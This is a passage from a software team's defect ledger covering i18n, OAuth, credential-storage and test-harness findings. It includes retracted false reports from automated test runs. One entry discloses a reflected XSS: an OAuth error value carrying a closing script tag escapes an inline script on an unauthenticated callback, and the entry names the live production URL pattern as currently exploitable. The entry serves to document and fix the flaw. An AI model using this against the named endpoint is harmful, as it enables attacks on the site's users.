  (`web/stores/automations.ts:238-250`), and `splitArgs` in `web/lib/api/core.ts` puts every
  non-path argument straight into the PATCH body. The server reads `patch.plan?.steps` and nothing
  else (`api/src/automation/service.ts` `patchAutomation`), and `AutomationPatch` is `.passthrough()`,
  so the key survives zod validation and is then ignored. TWO layers disagree, not one: the view step
  is `{id, description, type}` while the wire step is `{stepId, description, tool}`, so even a server
  that read the top-level key would be reading the wrong field names. NET EFFECT: editing a step and
  pressing Guardar changes nothing server-side, and because the store re-normalises the response into
  `current`, the edit visibly reverts. `create` carries the same mismatch
  (`web/stores/automations.ts:225-236` sends `steps`; `createAutomation` reads `input.plan?.steps`).
  NOT reproduced live - the running stack was off-limits for this unit, so the chain above is read
  from the code, and nothing in the suite contradicts it: neither `tests/drills/automations.spec.ts`
  nor `web/e2e/automation-deterministic.spec.ts` ever presses Guardar. WHY IT MATTERS FOR THE ENTRY
  ABOVE: the editor already authors the very fields the wire shape cannot carry - `step-card.tsx` +
  `integration-action-picker.tsx` let the user pick `integrationKey.actionName`, and
  `step-type-selector.tsx` offers all nine engine step types - so the widening question is not
  hypothetical: the UI has an authoring surface for it today and throws the result away on save.
  CANDIDATE CLOSE: normalise in the store's `create`/`update` (view steps -> `plan.steps` with
  `stepId`/`tool`), the mirror of the `normalizeWireAutomation` that already exists for the read
  direction, plus an e2e that edits a step description, saves, reloads and asserts the new text -
  BUT sequence it after the widening decision, because a faithful editor needs a wire shape that can
  carry an integration step, and until then the honest outcome for those types is the new 400.

- **`activate-page-shipped-untranslated-english`** (FIXED 2026-08-06, MEDIUM, i18n - Drill batch
  `01KZAP1CS3C3FYDYJ6T6ZS7MB9`). The CLI device-activation page (`/activate`) hardcoded every string
  in English ("Authorize this device", "No device code in the link...", "Only approve if you started
  this login...") while the rest of the product renders in pt-PT, so a user bounced here from the
  terminal login hit an untranslated page. FIXED by moving the copy into the locale contract
  (`pages.activate` in `web/locales/{types,pt,en}.ts`) and rendering it through `useTranslation()` in
  `web/app/activate/page.tsx`. The drill's e2e assertions and `tests/drills/activate.spec.ts` were
  moved to the pt-PT strings in the same unit, so `page-language-matches-app` and the text checks
  agree again.

- **`artifact-cards-rendered-literal-invalid-date`** (FIXED 2026-08-06, MEDIUM, data-integrity -
  same batch). Artifact cards printed the literal "Invalid Date" at rest whenever the API handed back
  a null/empty/malformed `createdAt`/`updatedAt`: `formatDate` and the detail-panel's direct
  `new Date(x).toLocaleDateString()` calls all formatted an Invalid Date straight to that string.
  FIXED in `web/components/artifacts/artifacts-surface.tsx` with a `toValidDate()` guard that returns
  null for an unparseable timestamp; `formatDate` now returns `string | null` and every call site
  omits the whole timestamp element rather than printing garbage - "a real formatted Portuguese date
  or the field omitted", per the drill.

- **`change-password-mismatch-rejection-read-as-a-defect-by-a-repair-step`** (DISMISSED 2026-08-06,
  discovery-run false positive, closed by a deterministic test + this dismissal). The batch reported
  that `/change-password` "changed the password rather than rejecting a mismatch", landing on
  `/login`. The page was always correct: `canSubmit` requires `newPassword === confirmPassword`, the
  submit is `disabled` on mismatch, `handleSubmit` early-returns on `!canSubmit`, and the confirm
  field shows "As palavras-passe não coincidem" inline. What the vision judge photographed was the
  run's OWN repair step re-typing a matching confirmation and submitting - the harness acting, not
  the page accepting a mismatch. Closed by graduating the step from vision to a deterministic e2e
  spec (`tests/drills/change-password.spec.ts#mismatch-rejected`) that asserts the inline error is
  shown, the submit stays disabled, and no success banner appears. LESSON: a vision step whose
  "success" only appears after an auto-repair typed the passing input is testing the harness, not the
  product - graduate it to a spec that pins the pre-repair state.
- **`zoho-sign-api-send-needs-a-paid-license`** (OPERATOR-BLOCKED 2026-08-06, external, not a
  defect). Driving the ERP's signature path end to end on staging, `POST /api/zoho-sign/send`
  reached Zoho and came back with `code 12000: Upgrade Zoho Sign license to send documents via
  API`. Everything on our side worked: the served-app context resolved app -> owner, the stored
  refresh token minted an access token against the platform OAuth client, the proposal HTML was
  rendered to PDF by the in-container Chromium, and the request was accepted for transport by
  Zoho's API - which then refused it on PLAN, not on auth or shape. The read side of the same
  credential works (`test_connection` returns live requests), so this is specifically the
  API-send entitlement.
  The refusal surfaces correctly: a sanitized PT-PT message with Zoho's own code preserved for an
  operator, and no token or secret in the body (`sendZohoError`).
  TO FINISH THE FLOW: the Zoho account behind ZOHO_CLIENT_ID needs a Zoho Sign plan that includes
  API sending. Production's account has it - that is why the SALOMAO flow runs there.

- **`microsoft-scopes-omitted-user-read-so-the-connection-probe-403d`** (FIXED 2026-08-06, MEDIUM,
  an integration that works reporting itself broken). `MICROSOFT_SCOPES` listed `openid profile
  email` and no `User.Read`. Those three populate the ID TOKEN; they do not authorize the Graph
  `/me` RESOURCE. Measured on staging against a real work/school connection: `/me` answered
  `403 Authorization_RequestDenied` while `/me/messages`, `/me/mailFolders/inbox/messages`,
  `/me/drive` and the whole SharePoint site-drive surface answered 200. `/me?$select=mail,
  userPrincipalName` is exactly what the SALOMAO ERP calls as its "is the workspace connected"
  probe (two screens), so the product would have shown the integration as broken while mail, files
  and SharePoint were all working.
  FIXED by adding `User.Read` to the requested scopes, pinned in
  `api/tests/integrations/platform.test.ts` alongside `offline_access` and `Sites.ReadWrite.All`.
  NOTE FOR THE OPERATOR: scopes are granted at CONSENT, so an already-connected workspace keeps the
  old grant - the Microsoft integration must be disconnected and reconnected once for `/me` to
  start answering.

- **`microsoft-connect-never-showed-an-account-picker`** (FIXED 2026-08-06, HIGH, a connect that
  binds the workspace to an account the user never chose - and cannot undo from the product).
  `microsoftAuthUrl` (`api/src/integrations/platform-oauth.ts`) sent no `prompt` parameter, while
  its Google sibling three functions above sends `prompt: 'select_account consent'`. Without it the
  Microsoft identity platform reuses whatever account the browser is already signed into and
  returns straight to the callback: the operator clicks "Ligar", a window flashes, and the page
  says "Ligação concluída" having asked nothing. Observed live on staging - a PERSONAL (MSA)
  account got bound this way, and it reports healthy on every surface we have while `/v1.0/sites`
  answers `not supported for MSA accounts`, i.e. the SharePoint capability the plane exists for
  cannot run (see `workspace-microsoft-connected-as-a-personal-account-cannot-reach-sharepoint`).
  WHY IT IS WORSE THAN A MISCLICK: there is no in-product recovery. Disconnecting drops OUR row but
  not Microsoft's browser session, so the next connect silently rebinds the same wrong account, and
  the operator has no affordance anywhere to choose a different one. The only escape was signing
  out of Microsoft in the browser.
  FIXED: `prompt: 'select_account'` on the Microsoft authorize URL - `select_account` alone rather
  than Google's pair, because Microsoft documents `prompt` as a SINGLE value
  (login|none|consent|select_account) and re-prompts consent by itself for a new account or scope
  set. Pinned by `api/tests/integrations/platform.test.ts`, which now asserts the picker parameter
  for BOTH providers in one test (the asymmetry is the bug, so the assertion is symmetric) plus
  that Microsoft still requests `offline_access` and `Sites.ReadWrite.All`.

- **`workspace-microsoft-connected-as-a-personal-account-cannot-reach-sharepoint`** (OPEN
  2026-08-06, MEDIUM, configuration + a swallowed failure the product should surface). On staging
  the workspace Microsoft connect completed and every platform-side signal says connected:
  `/api/v1/platform-integrations/microsoft` -> `{connected:true}`, `/api/app-cloud-files/status` ->
  `microsoft.connected:true`, and a real Graph call through the served-app proxy returns real data
  (`GET /api/m365/v1.0/me/drive` -> a live OneDrive). The workspace-credential seam is therefore
  working end to end. But the account that was connected is a PERSONAL Microsoft account (MSA), and
  SharePoint is an organizational-tenant API: `GET /v1.0/sites?search=...` and `GET /v1.0/organization`
  both answer `BadRequest: This API is not supported for MSA accounts`. So the SALOMAO ERP's
  `provisionClientSharePoint` - which does `/sites?search=Ekoa AI` and then PUTs the client folder
  tree into that site's drive - cannot work with this connection, while the dashboard shows the
  integration as healthy.
  TWO THINGS MAKE THIS WORSE THAN A WRONG CLICK. (1) `MICROSOFT_TENANT_ID=common` admits both
  account types, so nothing at consent time distinguishes the account that can do the job from the
  one that cannot; ekoa-dev's exchange decoded the id_token `tid` claim (`9188040d-...` = MSA)
  precisely so an org-only feature could tell them apart, and that discrimination was not ported.
  (2) The ERP swallows the failure: its SharePoint provisioning is deliberately best-effort so the
  conversion cascade never blocks, which means a user sees the client convert successfully and
  simply never gets folders, with no error anywhere.
  FIX (operator): connect the WORK/SCHOOL account of the tenant that owns the SharePoint site
  (prod used `ekoaai.sharepoint.com`), not a personal one. FIX (product, unported): record the
  account type at connect and either refuse or warn when an org-only capability is enabled against
  an MSA connection - a status that says "connected" while the only feature it exists for cannot
  run is the honest-degrade rule broken.

- **`zoho-callback-page-script-injection`** (FIXED-HERE 2026-08-06, HIGH, **live in ekoa-dev /
  api.ekoa.io** - not a defect of this repo, a defect this repo refused to inherit). The Zoho OAuth
  callback renders a server-built HTML page that hands the outcome to the opener via
  `postMessage`, embedding the values with `JSON.stringify` inside an inline `<script>`.
  `JSON.stringify` does not escape `/`, so a value containing a literal `</script>` CLOSES the
  script element during HTML parsing and everything after it is parsed as markup. The injected
  value on that page is the OAuth error string, which is reflected straight from Zoho's own
  `?error=` query parameter on an **unauthenticated** route - so a crafted link is reflected XSS on
  the API origin, with no state, no login and no interaction beyond the click. Same shape in the
  human-readable message line.
  In the port, `jsonForScript()` escapes `<`, `>`, `&` and U+2028/U+2029 before embedding, and the
  fallback link is attribute-escaped; the payload still arrives intact, just inert. Pinned by
  `api/tests/integrations/zoho-oauth.test.ts`, which asserts the page still contains exactly one
  `<script>`/`</script>` pair after an injection attempt. Found BY writing that test - upstream has
  no test of this route at all, which is also how its credential-clearing regression reached a
  customer.
  ACTION FOR THE OPERATOR: this is exploitable in production today at
  `https://api.ekoa.io/api/v1/oauth/zoho/callback?error=...`. The same `buildOAuthResultPage` is
  shared by the ADOBE callback, so both providers are affected. Fix is the four-line escape above,
  in `cortex/src/server.ts buildOAuthResultPage`.

- **`import-ignores-the-bundle-slug`** (FIXED 2026-08-14, LOW as filed — re-rated in practice: for
  the salomao migration the slug is the public URL living in emails already sent to the customer's
  clients, so the S3 slice closed it). The shared
  `ArtifactBundle` declares an optional `slug`, and `convert-dev-bundle.mjs` sets it from `--slug`,
  but `importArtifact` calls `generateSlug(name, deps)` and never reads `bundle.slug`. Importing
  `legal-case-manager-3` therefore produced `erp-juridico-brasil-salomao` (derived from the app's
  display name) with no warning. Harmless here - the served URL is cosmetic and app-data is keyed on
  the canonical id, not the slug - but a field the schema advertises and the importer silently drops
  is the same class of defect as the two manifest bugs fixed this week. FIX WHEN TOUCHED: honour
  `bundle.slug` when it is free, fall back to the generated one when taken, and say which happened.
  FIXED (2026-08-14, S3) exactly per that prescription: `importArtifact` honours a well-formed
  `bundle.slug` via an atomic reservation insert (duplicate `_id` = taken), falls back to
  `generateSlug` otherwise, and the import response now carries an additive `importReport` saying
  which happened (`slug.requested/applied/fellBack`). Landed together with the explicit
  `preserveId` migration mode (canonical id adopted from `bundle.id` only when the request opts in,
  409-refused on collision — `docs/decisions.md` 2026-08-14) and per-collection app-data seeding
  reports. Suites: `api/tests/apps/import-app-data-fidelity.test.ts`,
  `api/tests/contract/artifact-family.test.ts` (import block), `api/tests/migration/convert-dev-bundle.test.ts`.

- **`artifact-import-could-not-accept-a-real-app`** (FIXED 2026-08-06, HIGH, the import endpoint
  did not work for its own purpose). `POST /api/v1/artifacts/import` sat behind the app-wide 1 MB
  `express.json()`, and a real app export is bigger than that: the production
  `legal-case-manager-3` bundle is **1.34 MB of source alone**, before any app-data dump, and
  prod's own exporter admits files up to 1.5 MB EACH. So the endpoint whose entire job is
  importing real apps could only ever accept toy ones, and the first genuine import answered
  `413 PAYLOAD_TOO_LARGE`. `POST /:id/bundle-update` - the path prod patches are pushed through -
  had exactly the same ceiling.
  FIXED with the LLM gateway's established pattern, both halves: the two bundle routes mount their
  own parser (`bundleJson`, 25 MB, `EKOA_ARTIFACT_BUNDLE_MAX_SIZE`) AND `server.ts` exempts those
  paths from the global parser - without the exemption the global one consumes the body first and
  the router limit is dead code, which is the trap the gateway hit in run 20260717. The exemption
  is pinned at both ends (`/import` exact; `/:id/bundle-update` with the id charset between fixed
  segments) so no sibling route widens. Suite: `api/tests/contract/malformed-json.test.ts` asserts
  a 1.4 MB body reaches auth on both bundle routes (401, never 413) and that two neighbours -
  `POST /artifacts` and `/bundle-update/extra` - still cap at 1 MB.
  WHY IT WAS NEVER CAUGHT: every fixture bundle was small. The size limit is not a property any
  hand-written test bundle exercises, and the operator-run import driver skips cleanly without a
  real export - so the first real payload was the first test.

- **`prod-export-manifest-never-reached-the-import`** (FIXED 2026-08-06, HIGH, silent capability
  loss on every prod import). The first real export of `legal-case-manager-3` from api.ekoa.io
  carried 26 scaffold files and **no `manifest.json` among them** - prod keeps that information in
  the envelope's separate `manifest` FIELD, which it assembles from its own defaults overlaid with
  the on-disk file. `convert-dev-bundle.mjs` read only `id`/`name`/`version` off that field and
  dropped the rest, and ekoa-code's importer reads what an app declares from a manifest FILE. Net
  effect: the ERP would have imported with a DEFAULT manifest - no `backend: {handlers:['onEmail']}`,
  no `extends: 'app-auth-persistent'` - and would have built, served its UI, and silently never
  processed an email. Nothing would have failed; the feature would simply not exist.
  FIXED: the converter now always writes `manifest.json` into `bundle.files` from the envelope's
  manifest field, filling the build fields a sparse prod manifest omits, and the envelope's copy
  WINS over a stale scaffold copy of the same path (never both). Suite: the manifest-fidelity block
  in `api/tests/migration/convert-dev-bundle.test.ts`, including a case asserting the reconstructed
  manifest passes ekoa-code's own `validateManifest`.
  CAUGHT BY a warning deliberately put in the one-shot operator import script rather than by a test
  - the two formats had been "equivalent" in every fixture written by hand, because every fixture
  author put a manifest.json in the scaffold. The real export did not. Related and landed the same
  day: `ensureManifest` now REFUSES an invalid manifest instead of defaulting past it.

- **`m365proxy-manifest-flag-stripped`** (FIXED 2026-08-05, HIGH, dead opt-in - the workspace
  Microsoft plane could never be reached by any app). The Q-10 gate on `/api/m365/*`
  (`api/src/integrations/m365-proxy.ts`) requires a per-app manifest opt-in, and `server.ts`'s
  `resolveAppScope` reads it: `m365Proxy: (reg?.manifest as {m365Proxy?: boolean})?.m365Proxy === true`.
  But `validateManifest` (`api/src/apps/manifest.ts`) returns a WHITELIST of named keys, and
  `m365Proxy` was not among them - so the registry's manifest never carried the flag no matter what
  the author wrote in `manifest.json`, `resolveAppScope` always computed `false`, and every request
  to the workspace Graph proxy answered `403 App has not enabled the Microsoft 365 workspace proxy`.
  Two independent gates (served + opt-in) read as one that can never open. It went unnoticed because
  the plane's other half was ALSO stubbed (see the next finding): with the token seam throwing
  not-connected, a 403 and a 502 both looked like "not wired yet".
  FIXED: `m365Proxy?: boolean` declared on `AppManifest`, validated as a boolean (a truthy STRING is
  refused, never coerced into an opt-in), and carried through the return. Pinned by
  `api/tests/apps/manifest.test.ts`, which asserts both halves of the whitelist property - the
  declared flags survive a write→read round-trip, an undeclared key still does not.
  LESSON: a whitelist validator between an author and a consumer is a silent-drop machine. Any
  manifest key a gate reads needs a test that carries it end to end, not a type declaration.

- **`workspace-graph-token-was-a-permanent-not-connected-stub`** (FIXED 2026-08-05, HIGH,
  unimplemented plane presented as a wired one). `server.ts` passed `workspaceNotConnected(...)` as
  `getWorkspaceGraphToken` for `/api/m365/*` and as `workspaceCloudFiles.getAccessToken` for
  `/api/app-cloud-files/*`: both planes were mounted, documented, gated and tested, and could not
  reach Microsoft Graph at all. Honest (502 / 409, never a fake success) but permanently inert, so
  the SharePoint provisioning the SALOMAO ERP performs through `/api/m365/v1.0/sites/...` had no
  server-side path.
  FIXED by `api/src/integrations/workspace-credential.ts`: the workspace of a served app is the ORG
  OF ITS OWNER - platform-OAuth rows are org-scoped (`platform-<orgId>-<provider>`) - so the token is
  resolved per request from the app scope the router already admitted, refreshed behind the seam,
  and never ambient. Fails closed on an empty/unknown/org-less owner (no provider traffic at all on
  behalf of a non-tenant) and keeps the `not connected` / `reconnect required` degrade contract both
  routers already mapped. Suites: `api/tests/integrations/workspace-credential.test.ts` (tenancy,
  refresh, dead-token reauth, no token in an error message) and the extended
  `api/tests/contract/app-sso.test.ts`, which pins that the owner spent is the ADMITTED app's - not
  the header, not the caller's JWT - and that a refused gate never reaches the seam at all.
  STILL OPEN alongside it: the docx link/cloud ingest keeps the not-connected stub, because a build's
  tool call carries an appId but no owner down to `agents/seams.ts fetchFromCloud`; threading the
  run's owner through is tracked in `docs/dev-parity.md`.

- **`a-partial-credential-save-replaced-the-whole-bundle`** (FIXED 2026-08-05, HIGH, silent
  destruction of a stored secret). `updateConfig` (`api/src/integrations/service.ts`) encrypted
  `patch.configValues` verbatim as the new bundle, so a save carried away every field it did not
  include. A credential form only sends what was typed in that browser session - a masked field the
  user did not retype comes back as `''`, a field the form does not render does not come back at
  all - so re-pasting a Zoho `client_id`/`client_secret` erased the permanent `refresh_token`. In the
  old platform that exact sequence took Brasil Salomão's e-signature down (ekoa-dev `ca446cb0`,
  2026-07-28); this repo carried the same shape, untriggered only because nobody had re-saved a
  credential yet. Two further consequences rode along: the WS-C shadow and the non-secret
  `publicConfigValues` projection were both computed from the patch, so a partial save shrank the
  Rule-10 comparator's shadow and could drop a destination field a standing approval was bound to.
  FIXED: `mergeCredentialValues` - absent keys, `null`/`undefined`, and empty/whitespace strings all
  leave the stored value alone; only the explicit `CLEAR_CREDENTIAL` sentinel deletes a key. The
  ciphertext, the shadow and the projection are all computed from the MERGED bundle. An undecryptable
  stored blob now RETURNS `undecryptable` (route: 422 `SECRET_GUARD_BLOCKED`, telling the user to
  re-enter every credential) instead of merging blind - degrading to `{}` there would have turned a
  rotated encryption key into a full wipe on the very next save. Suite:
  `api/tests/integrations/credential-merge.test.ts` reproduces the Zoho incident directly.
  NOT a new error code on purpose: the shared `ErrorCode` enum is a client contract, and adding a
  member makes older clients read the body as "not the shared error envelope".

- **`chokepoint-gate-case-test-failed-on-a-case-insensitive-filesystem`** (FIXED 2026-08-05, LOW,
  harness-not-product). `tests/security/grep-gates.test.ts` planted `api/src/LLM/p.ts` in a sandbox
  that pre-creates `api/src/llm`, and asserted the gate refuses it. On macOS APFS the `mkdir` is a
  no-op and the file lands in the exempt directory, so the gate correctly reported clean and the
  test failed - on every local full-suite run, for months, on the harness rather than on the gate.
  FIXED by probing the sandbox filesystem once and skipping exactly that case when it cannot be
  posed (CI on Linux still runs it), with the always-true half - the real `llm/` paths ARE exempt -
  split into its own test that runs everywhere. Found while running the suite for an unrelated
  change; see also the ledger-census drift below - two gates rotted the same way.

- **`client-drift-gate-red-on-a-stale-node_modules`** (FIXED 2026-08-05, LOW, environment).
  `npm run gate:client-drift` - which sits in `ci:lane` BEFORE `typecheck`/`test`/`build`, so its
  failure hides everything after it - died with `ERR_MODULE_NOT_FOUND: openapi-typescript` on a
  clean tree. The package is correctly declared in `clients/cortex-cli/package.json`; the local
  `node_modules` had simply drifted from the lock file. `npm install` fixed it with NO lock-file
  change, and the gate reports clean. Worth knowing because the failure mode reads like client
  drift and is not: an `ERR_MODULE_NOT_FOUND` from a gate means the gate did not run.

- **`suite-ledger-unit-census-drifted-red`** (FIXED 2026-08-05, LOW, gate rot). `npm run gate:ledger`
  had been failing its frontend-unit count census (disk 50 vs ledger 49) since commit `105e10b`,
  which landed `web/__tests__/integration-user-scoped-skill.test.ts` without its `SUITE_LEDGER.json`
  row. Registered, with the reason recorded in the ledger's own `census_note` (the same class of
  omission that note already records three times). Found during an unrelated parity run - the census
  is only load-bearing if somebody runs it.

- **`the-dev-harness-proxy-never-propagated-client-disconnects`** (FIXED 2026-08-05, MEDIUM,
  dev-harness resource leak - and the root of a whole false defect report). `driver.mjs up`
  occupies `backend.port` (4111) with a small CORS reverse proxy and runs the real API on 4211.
  Its forward path did `proxyRes.pipe(res)` and nothing else: `pipe` forwards DATA, never
  TEARDOWN, so when a browser closed an SSE stream the proxy's upstream request to the API stayed
  open forever. The API never saw the disconnect, so `res.on('close')` never fired, its
  `SseManager` client was never deleted, and its 30s keepalive timer went on writing into a dead
  socket for the life of the process. `/health`'s `bridgeConnections` therefore only ever climbed:
  measured 67 attached clients against 12 real ESTABLISHED sockets, and +2 per document load with
  no decrease on page close, context close, or browser exit.
  THE API WAS ALWAYS CORRECT. The identical connect/abort straight to :4211 returns to baseline in
  under 3 seconds; `res.on('close')` fires, the client is deleted, the timer is cleared. That one
  substitution - bypass the proxy - is what separated harness from product, after `express.json`,
  the three `noServer` WebSocket upgrade surfaces, and an isolated Express 5 reproduction had all
  been eliminated as suspects. FIXED in the proxy: `res.once('close')` destroys the upstream
  request, with a `clientGone` flag so the existing error/retry path does not treat a deliberate
  teardown as an upstream failure and re-issue the GET. Verified: 0 -> 3 -> 0 within 2.5s through
  :4111, and flat at 1 across 12 full page loads (was 19 -> 46).
  WHY IT MATTERS BEYOND THE LEAK: a Drill authoring run read that climbing counter as evidence and
  wrote a fabricated "STANDING DEFECT" into `drills/drillbook.yml` - see the dismissal below.
  LESSON: a monotonic counter is not a measurement. Before believing `/health`, check it against
  something independent (here, `ss` said 12 where the counter said 67).

- **`a-drill-run-reported-a-product-wide-hang-that-was-its-own-harness`** (DISMISSED 2026-08-05,
  discovery-run finding, closed by written dismissal per the QA block). A Drill authoring run
  restarted the stack, re-tested, and reported a STANDING DEFECT: "the dashboard's data reads never
  reach the browser", every list sitting two minutes then rendering a red `Request timed out after
  120000ms` banner over a false empty state, `/settings/users` printing "0 utilizadores  0
  administrador  0 ativo" to the administrator it was counting, `/utilizacao` showing a silent
  false empty, `/registo` claiming "Sem entradas no registo.", `/chat` stranded on a spinner, and
  the /change-password form spinning forever. It concluded roughly a third of the Book's assertions
  should be expected red and that every page needed a two-minute settle.
  NONE OF IT REPRODUCES. Re-driven the same day against the same stack, in a clean browser context:
  every named page renders in full, every request behind them answers 200 in single-digit ms, the
  token meter resolves to "0/10.0M" - across 12 full page loads AND 35 client-side navigations,
  with zero pending requests. `/registo` shows 35 entries, `/chat` renders its composer, and the
  change-password form posts `/api/v1/auth/password`, gets 200 in 757ms and lands on /login in ~3s.
  CAUSE: the run drove a long-lived explorer browser through the leaking harness proxy above, and
  read the climbing `bridgeConnections` counter as proof of a product-wide fetch failure. Its own
  transcript records the counter reaching 6 - Chrome's per-origin HTTP/1.1 connection limit - which
  is how a genuinely wedged tab and a mis-attributed counter looked alike.
  TWO OF ITS CLAIMS WERE REAL and are fixed separately: the raw English timeout string (below) and
  the dead recovery link (below). One was a harness artifact of a different kind: `/registo`'s
  "mm/dd/yyyy" date filters are `<input type="date">`, whose display format is chosen by the
  BROWSER's locale and cannot be set by the page - headless Chromium defaults to en-US. Not a
  product defect; do not re-file it.
  ACTION TAKEN: the fabricated STANDING DEFECT block in `drills/drillbook.yml` `globalRules` is
  replaced with a retraction plus the verified account, because as written it would have told every
  future run to wait two minutes per page and to attribute any red assertion to a defect that does
  not exist. The four page files whose notes cited the 120s timeout are annotated in place.
  LESSON: the run did the right thing by restarting the stack to rule out a stale environment, and
  still landed on the wrong cause because it never tested the API without the harness in front of
  it. When browser and curl disagree, the thing between them is the first suspect.

- **`a-raw-english-timeout-string-reaches-a-pt-pt-ui`** (FIXED 2026-08-05, LOW, copy). The Drill run
  was right that `Request timed out after 120000ms` is a defect, even though the hang that surfaced
  it was not real. `web/lib/api/core.ts` threw three transport failures with English developer
  strings - `Request timed out after ${timeoutMs}ms`, `Request aborted`, `Network request failed` -
  and callers surface `err.message` directly, so any real timeout puts English in front of a
  Portuguese-only product. The class docblock in `web/lib/api/errors.ts` already asserted these
  messages were "user-safe and PT-aware", which was false for exactly these three. FIXED to the
  wording the `backendErrors` block in `web/locales/pt.ts` already uses for the same conditions;
  the machine-readable `code` is unchanged and the timeout budget moved into `details` rather than
  being printed at the user.

- **`the-forgot-password-link-pointed-at-a-page-needing-the-forgotten-password`** (FIXED 2026-08-05,
  LOW, dead-end UX). `/login` rendered "Esqueceu-se da palavra-passe?" as a `<Link href="/change-password">`.
  That route requires authentication AND the current password - the very thing the user has lost -
  and, signed out, redirects straight back to /login, so clicking it did nothing at all: no route
  change, no dialog, no message, no console error. There is no self-service recovery in this
  product: the only reset is `POST /api/v1/users/:id/password`, auth class `super-admin`. FIXED by
  replacing the dead control with the instruction that matches reality ("Peça ao administrador da
  plataforma para a repor."), stacked below the remember-me checkbox rather than beside it - sharing
  that flex row forced the checkbox label onto three lines in a 400px card.

- **`a-forced-password-change-was-skipped-on-the-submit-path`** (FIXED 2026-08-05, HIGH, auth
  bypass - found while verifying a Drill planning run's defect list). `seedAdmin` creates the
  super-admin with `passwordChangeRequired: true` and `POST /auth/login` returns that flag, but
  /login's `redirectAfterAuth` read it out of a **stale closure**: `handleSubmit` calls the callback
  immediately after `await login(...)` resolves, and the captured `passwordChangeRequired` is still
  the PRE-login value (`false`), so the branch that routes to /change-password never ran and the user
  landed on the dashboard. The same function already dodged this exact hazard for the token — it
  takes `latestToken` as a parameter *because* the store write is not visible to this closure — and
  the flag was left reading the stale one right beside it. The already-authenticated path
  (`useEffect` at mount, from a persisted token) used the reactive value and DID redirect, which is
  why the behaviour looked intermittent: sign in fresh and the forced change was skipped, arrive
  with a token and it was enforced. FIXED by reading `useAuthStore.getState().passwordChangeRequired`
  at call time. Verified: three consecutive fresh sign-ins now land on /change-password showing
  "Deve alterar a palavra-passe antes de continuar".
  NOTE: ~30 e2e specs signed in as admin and asserted `waitForURL(/\/chat/)` — i.e. the suite was
  green *because of* this bug. They now route through `web/e2e/helpers/ui-login.ts`, which normalises
  the admin over the API before driving the UI (spend the forced change, then change back, leaving
  `admin`/`tmp12345` with the flag clear) so the many specs that authenticate over the API with the
  seeded password keep working. The forced-change path itself stays covered by change-password.spec.ts.
  LESSON: a callback that already takes one post-await value as a parameter is announcing that its
  closure is stale; every other store field it reads is suspect for the same reason.

- **`a-404-detail-page-never-left-its-loading-state`** (FIXED 2026-08-05, MEDIUM, honest state).
  `/automations/<unknown-id>` rendered a bare full-viewport "A carregar..." forever. The requests had
  in fact finished — `GET /automations/:id` and `.../triggers` both answered 404 in ~20ms — but the
  page's only early return was `if (!current || current.id !== id) return <LoadingState/>`, with no
  branch for "the fetch is over and produced nothing". The store already tracked `currentLoading` and
  `error`; the page read neither. A spinner over a finished 404 is a lie, and it also stripped the
  user of the page header and of any way back. FIXED with a three-way branch (loading / not-found /
  loaded); the not-found state renders the section header plus an EmptyState and a "Voltar às
  automatizações" link. Guarded against a first-render flash of the not-found state by gating on a
  ref holding the id a fetch was actually dispatched for, since `currentLoading` is still false on
  the render before the effect runs.

- **`pt-pt-copy-was-partly-brazilian-and-partly-unaccented`** (FIXED 2026-08-05, LOW, copy quality).
  `web/locales/pt.ts` carried 84 defects against the product's own pt-PT bar: 64 words missing their
  diacritic ("Terminar Sessao", "interacoes", "Padroes", "ambitos", "revisao", "sera", "utilizacao",
  "codigo", "maiuscula"/"minuscula"/"numero" in the password policy), and 20 strings in Brazilian
  register — the whole `backendErrors` block ("Sua sessao expirou. Faca login novamente.", "A
  requisicao e invalida. Verifique seus dados."), Brazilian gerund progressives ("Carregando...",
  "Preparando tudo...", "Planejando a melhor abordagem...", "Construindo...", "Processando...") where
  the same file's `friendlyMessages` block already used the correct "a + infinitive" form, and two
  missing crases. FIXED wholesale; verified by rendering /memory, /knowledge, /usage,
  /settings/users, /settings/platform and /artifacts and matching against the offending forms.

- **`hardcoded-jsx-text-never-reached-the-locale-files`** (FIXED 2026-08-05, LOW, i18n). Switching to
  EN left parts of some pages in Portuguese — not because a translation was missing but because the
  strings bypassed the locale system entirely: `/knowledge`'s header description, its "O que a Ekoa
  aprendeu" action and its whole agents-first banner were literal JSX; the settings sub-navigation
  ("Plataforma / Pedidos / Utilizadores / Escritórios") was a module-level const; and the users
  table's "Escritório" column header was a literal. FIXED by adding `pages.knowledge`,
  `pages.settingsNav` and `pages.users.office` to `types.ts` + both locales and wiring the call
  sites. Verified: /knowledge, /memory and /settings/users now contain no Portuguese under EN.

- **`the-drill-authoring-run-reported-a-product-wide-hang-that-does-not-exist`** (DISMISSED
  2026-08-05, discovery-run finding, closed by written dismissal per the QA block). The Drill Book
  planning run (2026-08-05, 04:46-05:05 local) reported that "the client hangs its own fetches" on
  /automations, /cofre, /knowledge, /memory, /settings/users, /settings/offices and
  /settings/pedidos; that the top-bar token meter "never resolves past its grey skeleton, on every
  page"; that /settings/api-keys shows a heading over blank space; and that /integrations "never
  renders its search box or filter chips" with "most cards stuck as skeletons". NONE of it
  reproduces. Re-driven the same day against the SAME still-running stack (api pid 755077 and the
  web dev server both up since 04:46; the in-memory Mongo never restarted), every one of those pages
  renders its full content, every API request behind them answers 200 in under 60ms, the token meter
  reads "Tokens 0/10.0M" on every page, /integrations renders its search input, its
  "Todas 9 / Ativadas 0 / Configuradas 0 / Disponíveis 9" chips and all 9 cards, and the console is
  clean. The one spinner in that list that WAS real is logged separately above
  (`a-404-detail-page-never-left-its-loading-state`) and is a missing not-found branch, not a hang.
  ON THE CREDENTIAL THEORY, which is what prompted the re-check: the model credential was NOT
  missing during the authoring run. `activity_logs` puts the credential `set` at 03:46:48.509Z, nine
  seconds into boot and BEFORE the run's first login at 03:46:57Z; the later `set` at 07:12:24Z is a
  `npm run dev:auth` re-arm of an already-present credential. It could not have been the cause
  anyway — none of the hung pages touch the LLM, and `GET /api/v1/users` is a Mongo read.
  MOST LIKELY CAUSE: the run began 36 seconds after the web dev server started, so every route it
  visited was being compiled on demand for the first time, on a box also running several other Next
  servers; a screenshot taken mid-compile is indistinguishable from a hung fetch. Not proven — the
  routes are warm now and the window cannot be reconstructed — which is exactly why it is dismissed
  rather than re-filed.
  ACTION TAKEN: `drills/drillbook.yml`'s `globalRules` asserted three of these as standing product
  facts, which would have produced a false failure on EVERY page of every future run. Corrected: the
  token-meter rule now states the requirement without the false "it currently renders as a grey
  skeleton"; the language-switcher rule no longer claims EN "relabels only the top bar and sidebar"
  (verified false — /memory translates completely; the real defect was the hardcoded-JSX one logged
